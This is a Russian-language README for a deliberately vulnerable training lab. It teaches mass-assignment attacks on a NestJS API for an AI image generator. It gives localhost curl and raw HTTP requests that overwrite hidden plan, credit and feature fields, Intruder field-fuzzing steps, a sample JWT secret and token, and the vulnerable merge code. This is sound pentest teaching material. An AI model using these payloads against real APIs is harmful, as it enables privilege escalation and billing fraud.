# AI Image Generator — Mass Assignment Lab (2026)

Это учебная лаборатория по уязвимости **Mass Assignment** (в первую очередь **nested** вариант) в современном REST API на базе NestJS и SQLite.

## Быстрый запуск

1. **Установка зависимостей**:
   ```bash
   npm install
   ```

2. **Настройка окружения**:
   Создайте или отредактируйте `.env` в корне проекта:
   ```env
   DATABASE_URL=sqlite:ai-gen-lab.db
   JWT_SECRET=gegey54363363ge
   PORT=3001
   ```

3. **Запуск сервера**:
   ```bash
   npm run start:dev
   ```
   Сервер будет доступен по адресу: `http://localhost:3001`
   
4. **Swagger UI**:
   Для интерактивного тестирования API перейдите по адресу:
   `http://localhost:3001/api/docs#/` (или по вашему локальному IP, например `http://192.168.1.106:3001/api/docs#/`)

---

## Документация API

Все запросы должны иметь заголовок `Content-Type: application/json`. Для защищенных эндпоинтов требуется заголовок `Authorization: Bearer <JWT_TOKEN>`.

### 1. Регистрация (Публичный)
**Важно**: Используйте метод `POST`.

```bash
curl -X POST http://localhost:3001/users/register \
     -H "Content-Type: application/json" \
     -d '{"username": "hacker", "email": "hacker@example.com", "password": "password123"}'
```
**Ответ**: Содержит `id` пользователя и `access_token`.

### 2. Аутентификация (Публичный)
```bash
curl -X POST http://localhost:3001/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email": "hacker@example.com", "password": "password123"}'
```

### 3. Кто я? (Защищенный)
Самый простой способ узнать свой ID и данные профиля, имея только токен.
```bash
curl -H "Authorization: Bearer <TOKEN>" \
     http://localhost:3001/users/me
```

### 4. Просмотр своего профиля (Защищенный)
```bash
curl -H "Authorization: Bearer <TOKEN>" \
     http://localhost:3001/users/<YOUR_ID>
```
*Примечание: Возвращает только публичные поля (username, fullName, profile, createdAt). Бизнес-поля скрыты.*

### 4. Генерация изображения (Защищенный)
Демонстрирует текущие лимиты и возможности аккаунта.

```bash
curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNWMxNDg2My1jZmM5LTQ4MjktOGFkYi1kODM0OWM2OTdhMDIiLCJlbWFpbCI6ImhhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3MDU1NDUzNywiZXhwIjoxNzcwNTU4MTM3fQ.3hw8XhS7ALjeZnCC8sycMZLAxVtRETyET0MxSlzbBJc" \
     http://localhost:3001/users/generate-image
```
*На бесплатном плане у вас всего 5 кредитов и базовая модель.*

### 5. Уязвимый эндпоинт: Flat Update (Защищенный)
Классический Mass Assignment через `Object.assign`.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"plan": "pro", "generationCredits": 999}' \
     http://localhost:3001/users/<YOUR_ID>/flat
```

### 6. Уязвимый эндпоинт: Nested Update (Защищенный)
**Основная цель лабы**. Уязвимость при слиянии (merge) вложенных объектов.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"features": {"unlimitedGenerations": true}}' \
     http://localhost:3001/users/<YOUR_ID>/nested
```

### 7. Уязвимый эндпоинт: Full Object Update (Защищенный)
**Для тестирования Reflected/Persisted**. В отличие от `/flat`, этот эндпоинт возвращает *полный* объект пользователя в ответе, включая скрытые поля типа `plan` и `generationCredits`.

```bash
curl -X PUT -H "Authorization: Bearer <TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"plan": "enterprise"}' \
     http://localhost:3001/users/<YOUR_ID>/full
```

## Методология поиска уязвимостей (Tips for Pentesters)

Профессиональный пентестер использует несколько источников информации для поиска скрытых полей:

### 1. Подсказки в тексте ошибок (Information Leakage)
Если у вас закончатся кредиты, метод `generateImage` вернет ошибку:
`"You have 0 generation credits left. Upgrade to Pro for unlimited access."`
Фраза **"generation credits"** в тексте сообщения — это классическая зацепка. Опытный исследователь сразу попробует варианты `generation_credits`, `generationCredits` или просто `credits`.

### 2. Swagger и документация
В Swagger-интерфейсе (доступен по `/api/docs#/`) часто остаются «утечки» в примерах тел запросов. В этой лабе в примере для `PUT /users/{id}/flat` явно указано:
```json
{ "plan": "pro", "generationCredits": 999 }
```
В реальной жизни разработчики часто забывают обновлять примеры в документации, и они становятся бесценным источником знаний о внутренних именах полей.

### 3. Разрыв между Input и Output
В ответе вы видите `remainingCredits`, но в базе поле называется `generationCredits`. Это сделано намеренно. 
Разрыв между тем, что мы видим в ответе (Output), и тем, что мы можем перетереть (Input) — это стандартная ситуация. Ее нужно преодолевать через фаззинг по словарю (`wordlist.txt`) и анализ косвенных улик (как в п.1).

### 4. Отладка через серверные логи (Debug Logging)
В этой лабе настроено подробное логирование входящих данных в [users.service.ts](file:///e:/caido-plugins/Mass-Assignment-Radar/Mass-Assignment-Radar/lab/src/users/users.service.ts). Это позволяет в реальном времени видеть процесс «отравления» объекта.

Когда вы запускаете сканнер или отправляете запросы вручную, в консоли сервера (`npm run start:dev`) отображаются логи:

**Для эндпоинта /flat:**
```text
[Mass Assignment] Incoming payload to /flat: { fullName: 'Ivan', plan: 'pro' }
[Mass Assignment] User object after Object.assign: {
  id: '...',
  username: 'hacker',
  plan: 'pro',
  generationCredits: 5
 }
 ```

 **Для эндпоинта /nested:**
 ```text
 [Mass Assignment] Incoming payload to /nested: { features: { unlimitedGenerations: true } }
 [Mass Assignment] User object after nested merge: {
   id: '...',
   features: { unlimitedGenerations: true },
   profile: { ... }
 }
 ```

 **Что это дает пентестеру?**
- **Визуализация уязвимости**: Вы видите момент, когда «грязные» данные из вашего запроса (`raw`) проникают в чистый объект пользователя.
- **Отладка Blind-атак**: Если в ответе ничего не меняется, вы можете посмотреть в логи сервера и понять: а вообще дошли ли туда данные?
- **Понимание механики**: Логи наглядно показывают разницу между `Object.assign` (который просто копирует всё подряд) и вложенным мерджем объектов.

Это отличный способ убедиться, что сканнер делает свою работу, даже если вы тестируете «вслепую» без Follow-up верификации.

---

## Работа в Burp Suite / Caido

Для эксплуатации уязвимостей в этой лабе удобнее всего использовать **Burp Suite (Repeater)** или **Caido (Request/Replay)**. 

### Как отправить запрос:
1. Скопируйте нужный RAW-запрос ниже.
2. В Burp Suite перейдите во вкладку **Repeater**, нажмите правой кнопкой в поле запроса -> **Paste from file** (или просто вставьте текст).
3. Убедитесь, что **Host** установлен в `localhost` и **Port** в `3001`.
4. Нажмите **Send**.

### Примеры Raw-запросов

#### 1. Регистрация
```http
POST /users/register HTTP/1.1
Host: localhost:3001
Content-Type: application/json

{
  "username": "hacker",
  "email": "hacker@example.com",
  "password": "password123"
}
```

#### 2. Проверка профиля (Nested Exploit)
После получения токена и ID:
```http
PUT /users/<ID>/nested HTTP/1.1
Host: localhost:3001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "features": {
    "unlimitedGenerations": true
  }
}
```

#### 3. Брутфорс полей через Intruder (Flat)
Для поиска скрытых параметров на верхнем уровне (например, `role`, `isAdmin`, `plan`):
1. Отправьте запрос `PUT /users/<ID>/flat` в **Intruder**.
2. В теле запроса установите маркер на имя поля:
```http
PUT /users/<ID>/flat HTTP/1.1
Host: localhost:3001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "§field§": "test_value"
}
```
3. Загрузите `wordlist.txt` и запустите атаку. Если поле существует, оно перезапишется в БД.

#### 4. Брутфорс полей через Intruder (Nested)
Для поиска скрытых полей внутри объекта `features` или `profile`:
1. Отправьте запрос `PUT /users/<ID>/nested` в **Intruder**.
2. Установите маркер внутри вложенного объекта:
```http
PUT /users/<ID>/nested HTTP/1.1
Host: localhost:3001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "features": {
    "§field§": true
  }
}
```
3. Загрузите `wordlist.txt` и запустите атаку.

---

## Задание

1. **Зарегистрируйтесь** и получите JWT-токен.
2. Попробуйте сгенерировать несколько изображений через `/users/generate-image`, пока не получите ошибку `Limit exceeded`.
3. Используйте **wordlist.txt** для поиска скрытых полей в объектах `features` или `profile`.
4. Эксплуатируйте уязвимость в `/users/:id/nested` или `/users/:id/flat`, чтобы:
   - Стать Pro-пользователем (`plan: "pro"`).
   - Получить безлимитные генерации (`features.unlimitedGenerations: true`).
   - Получить приоритет в очереди (`features.priorityQueue: true`).
5. Проверьте успех, снова вызвав `/users/generate-image`. Вы должны увидеть сообщение о доступе к Enterprise-моделям и безлимитным кредитам.

## Подсказки
- Если вы получаете `401 Unauthorized` на регистрации — проверьте, что вы используете метод **POST**, а не GET.
- Поля, которые стоит искать: `plan`, `role`, `isAdmin`, `generationCredits`, `features`, `unlimitedGenerations`, `priorityQueue`.
- Файл `wordlist.txt` содержит 1000+ имен полей, которые часто встречаются в современных API.

## Как это работает (технически)
Уязвимость реализована в [users.service.ts](file:///e:/caido-plugins/test/ai-gen-mass-assignment-lab/src/users/users.service.ts):
- В методе `updateFlat` используется `Object.assign(user, raw)`, что позволяет перезаписать любое свойство сущности `User`.
- В методе `updateNested` используется деструктуризация `{ ...user.features, ...raw.features }`, что позволяет внедрять любые ключи во вложенные JSON-объекты.

Автор: Лаборатория создана для обучения пентестеров в 2026 году.
